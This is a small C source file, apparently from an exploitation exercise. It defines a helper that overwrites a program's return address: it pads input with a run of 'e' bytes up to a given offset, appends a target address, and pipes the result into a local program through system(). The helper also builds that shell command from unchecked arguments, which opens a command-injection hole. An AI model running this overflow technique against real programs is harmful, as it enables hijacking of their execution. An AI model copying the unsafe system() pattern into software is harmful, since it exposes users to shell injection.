#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void override_return(char* prgrm, char* address, int offset){
          printf("override return received: %s, %s, %d\n", prgrm, address, offset);

          int len = strlen(prgrm);
          char cmd[10000] = "echo ";
          for (int i = 0; i < offset; i++) {
               strcat(cmd, "\x65");
          }
          strcat(cmd, address);
          strcat(cmd, " | ./");
          strcat(cmd, prgrm);
          system(cmd);
}
